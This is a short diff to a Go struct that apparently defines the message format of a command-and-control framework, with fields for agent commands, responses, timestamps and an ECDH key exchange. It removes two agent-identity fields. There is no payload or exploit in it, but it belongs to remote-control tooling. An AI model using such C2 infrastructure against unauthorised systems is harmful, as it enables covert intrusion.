@@ -84,10 +84,8 @@ type MsgTunData struct {
 	JobID            string            `cbor:"1,keyasint"`  // job ID, to retrieve the response, or empty if not a command
 	CmdSlice         []string          `cbor:"2,keyasint"`  // command args, [0] is the command, or empty if not a command
 	Response         []byte            `cbor:"3,keyasint"`  // response from the agent, or message to operator
-	Tag              string            `cbor:"4,keyasint"`  // tag of the agent, or message type if sent to operator
+	Tag              string            `cbor:"4,keyasint"`  // agent tag for agent->C2, or message type if sent to operator
 	Time             string            `cbor:"5,keyasint"`  // timestamp
-	AgentUUID        string            `cbor:"6,keyasint"`  // agent UUID for robust identification
-	AgentUUIDSig     string            `cbor:"7,keyasint"`  // agent UUID signature for verification
 	EphemPublicKey   []byte            `cbor:"8,keyasint"`  // ephemeral public key for ECDH key exchange
 	EnrichedPeerList *EnrichedPeerList `cbor:"10,keyasint"` // C2-provided peer list
 }
